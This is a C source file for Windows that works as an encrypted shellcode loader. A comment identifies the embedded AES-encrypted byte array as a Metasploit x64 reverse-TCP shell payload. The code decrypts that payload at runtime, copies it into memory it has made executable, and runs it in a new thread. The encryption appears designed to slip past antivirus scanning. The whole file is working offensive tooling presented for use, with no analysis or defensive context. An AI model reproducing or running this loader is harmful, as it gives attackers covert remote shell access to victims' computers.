/* Modifed lalualwan
*/

#include <Windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")

void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Failed in CryptAcquireContextW (%u)\n", GetLastError());
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("Failed in CryptCreateHash (%u)\n", GetLastError());
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        printf("Failed in CryptHashData (%u)\n", GetLastError());
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("Failed in CryptDeriveKey (%u)\n", GetLastError());
        return;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen)) {
        printf("Failed in CryptDecrypt (%u)\n", GetLastError());
        return;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

int main() {

	// use payload/windows/x64/shell_reverse_tcp
	// MessageBox(NULL, "Hello OxWan", "@0xWan", MB_OK);
	unsigned char AESkey[] = { 0x26, 0xd6, 0xa9, 0x69, 0x9b, 0x55, 0xd3, 0x1f, 0xce, 0x6, 0xf5, 0x8f, 0xb6, 0x52, 0x1f, 0xfc };
	unsigned char payload[] = { 0x9d, 0x81, 0x73, 0x81, 0xb3, 0x27, 0xf3, 0x72, 0xb3, 0x5, 0x4d, 0x9d, 0xd8, 0x66, 0xca, 0x45, 0x3b, 0xf4, 0x59, 0x4d, 0x4, 0xb8, 0xad, 0xd3, 0x1c, 0x5d, 0x37, 0x22, 0x9e, 0xd5, 0x3c, 0x30, 0x8, 0xc2, 0xdd, 0xb0, 0x4b, 0x68, 0x41, 0x26, 0x5e, 0x54, 0x65, 0x49, 0x87, 0x3e, 0x7e, 0x1a, 0x8, 0x98, 0xb0, 0xb0, 0xb0, 0x1a, 0xe7, 0x96, 0x46, 0xef, 0xf6, 0xdd, 0xe8, 0xd2, 0xef, 0x47, 0xef, 0x63, 0x29, 0x73, 0x16, 0x3f, 0xc, 0xd6, 0xf2, 0x82, 0x42, 0x9f, 0x9, 0x26, 0x71, 0x75, 0xc8, 0xa3, 0x3b, 0x2f, 0x5d, 0xae, 0x27, 0x43, 0x2b, 0xad, 0xcd, 0x2f, 0x49, 0xbc, 0x9, 0x32, 0x44, 0x3a, 0x89, 0xd3, 0x8, 0x92, 0x84, 0x60, 0x7c, 0x82, 0xc6, 0x0, 0x6b, 0x54, 0xfa, 0xb3, 0x59, 0x3e, 0x86, 0xec, 0x63, 0xed, 0xf, 0x3f, 0xa2, 0xd, 0xc9, 0x8d, 0x43, 0xaa, 0xcd, 0x5d, 0x93, 0x54, 0x57, 0x6a, 0x1b, 0xbc, 0x13, 0x4b, 0x28, 0xa, 0xe, 0x53, 0x77, 0x6c, 0xf3, 0x0, 0x3a, 0x80, 0x1a, 0xc1, 0x46, 0x59, 0xc8, 0xde, 0x28, 0x52, 0xb5, 0x4d, 0xb5, 0x3d, 0xf0, 0xaa, 0xfc, 0xe7, 0x3d, 0x88, 0xfe, 0x63, 0xdc, 0x85, 0x13, 0xd5, 0x80, 0xc7, 0xe4, 0xad, 0x20, 0x9e, 0xcb, 0x97, 0x5b, 0xb5, 0x25, 0xf9, 0x61, 0x4f, 0xdc, 0xcf, 0x1a, 0xc1, 0xa, 0x28, 0x91, 0xb8, 0xc1, 0x49, 0x28, 0xea, 0x72, 0x34, 0xbb, 0xc1, 0x6f, 0x4b, 0xd0, 0x92, 0x2a, 0xec, 0x39, 0x55, 0xfd, 0x5f, 0x2b, 0xd9, 0x6, 0x5, 0xa9, 0x9b, 0xfb, 0xfd, 0x97, 0xc2, 0x4d, 0xd5, 0x77, 0x51, 0xf1, 0xd5, 0x8c, 0x5, 0x6, 0x6e, 0x4a, 0x7e, 0x5, 0xbe, 0xd3, 0x46, 0xe8, 0xfa, 0xde, 0x9d, 0x4d, 0xbe, 0x89, 0x6b, 0x8d, 0x50, 0x2f, 0x28, 0xec, 0x44, 0xf, 0x83, 0xc, 0xbb, 0x7c, 0xfb, 0x8a, 0x90, 0xd8, 0xd7, 0x5c, 0xff, 0xc1, 0x76, 0x62, 0xf7, 0x8c, 0x92, 0x4b, 0x68, 0x32, 0xc3, 0xa1, 0xdd, 0x42, 0x7a, 0x9a, 0xf3, 0x45, 0x7, 0xfb, 0xa, 0xf, 0x81, 0x21, 0x4c, 0x35, 0xad, 0xc1, 0xc5, 0xc4, 0x5a, 0x4, 0x84, 0x17, 0x41, 0x5, 0xca, 0x36, 0x74, 0x66, 0x1b, 0x6f, 0x23, 0xc6, 0xed, 0x5f, 0x1f, 0x61, 0xa9, 0xbe, 0xe0, 0x66, 0x80, 0xba, 0x8, 0xaa, 0xad, 0x60, 0x61, 0xd5, 0xd0, 0x7, 0x71, 0x39, 0xd1, 0x81, 0xcb, 0x28, 0x7f, 0x7f, 0x52, 0x2e, 0xb7, 0x2e, 0xc0, 0xa3, 0x30, 0xea, 0x6e, 0x5f, 0xe8, 0x37, 0x13, 0x73, 0x25, 0x73, 0x6, 0x41, 0x11, 0x7d, 0x55, 0xf9, 0x39, 0x5f, 0x1e, 0x5c, 0xf3, 0x2e, 0x39, 0x19, 0xb7, 0xb0, 0x32, 0x80, 0xb3, 0xc3, 0x9d, 0x4, 0x4d, 0xc1, 0x94, 0xd7, 0x97, 0xd3, 0x70, 0x94, 0x1c, 0x2b, 0xa7, 0xae, 0x70, 0x8, 0x35, 0x67, 0xf1, 0xfe, 0x6d, 0x37, 0xf4, 0x6f, 0x2d, 0xf0, 0x85, 0xcc, 0xa7, 0xaa, 0x6d, 0x79, 0x13, 0xb2, 0x6e, 0xe2, 0x7, 0x64, 0xe2, 0x54, 0x2e, 0xbd, 0xde, 0xb5, 0x4, 0x69, 0x89, 0x6c, 0xf4, 0x57, 0x31, 0x1c, 0x31, 0xf4, 0xa5, 0xc4, 0x56, 0xd7, 0xbb, 0xf7, 0x95, 0xa8, 0x18, 0x53, 0xa9, 0xf8, 0x9e, 0xd3, 0x99, 0x82, 0x9b, 0x1c, 0xa2, 0xef, 0x3, 0xcd, 0xd, 0x49, 0x57, 0x93, 0x1f, 0x7d, 0x38, 0x28, 0xdf, 0x5e, 0xfd, 0xe2, 0x11, 0x42, 0xe9, 0x5b, 0xeb, 0x9e, 0xd3, 0xea, 0x1 };


	DWORD payload_length = sizeof(payload);
	
	LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!alloc_mem) {
		printf("Failed to Allocate memory (%u)\n", GetLastError());
		return -1;
	}
	DecryptAES((char*)payload, payload_length, AESkey, sizeof(AESkey));
	MoveMemory(alloc_mem, payload, sizeof(payload));
	//RtlMoveMemory(alloc_mem, payload, sizeof(payload));


	DWORD oldProtect;

	if (!VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
		printf("Failed to change memory protection (%u)\n", GetLastError());
		return -2;
	}


	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if (!tHandle) {
		printf("Failed to Create the thread (%u)\n", GetLastError());
		return -3;
	}

	// printf("\n\nalloc_mem : %p\n", alloc_mem);
	WaitForSingleObject(tHandle, INFINITE);
	getchar();
	((void(*)())alloc_mem)();

	return 0;
}

